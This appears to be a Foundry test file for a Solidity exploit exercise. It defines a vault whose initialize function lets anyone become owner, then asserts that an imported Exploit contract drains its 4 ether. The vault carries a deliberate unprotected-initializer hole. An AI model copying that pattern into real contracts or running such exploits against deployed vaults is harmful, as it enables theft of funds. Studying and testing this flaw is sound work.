// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/Exploit.sol";

contract TargetVault {
    address public owner;
    constructor() payable {}
    function initialize(address _owner) external {
        owner = _owner;
    }
    function sweep(address payable to) external {
        require(msg.sender == owner, "NOT_OWNER");
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok);
    }
}

contract UnprotectedInitTest is Test {
    TargetVault public vault;
    Exploit public exploit;

    function setUp() public {
        vault = new TargetVault{value: 4 ether}();
        exploit = new Exploit();
    }

    function testExploitDrainsVault() public {
        exploit.pwn(address(vault));
        assertEq(address(vault).balance, 0);
        assertEq(address(exploit).balance, 4 ether);
    }
}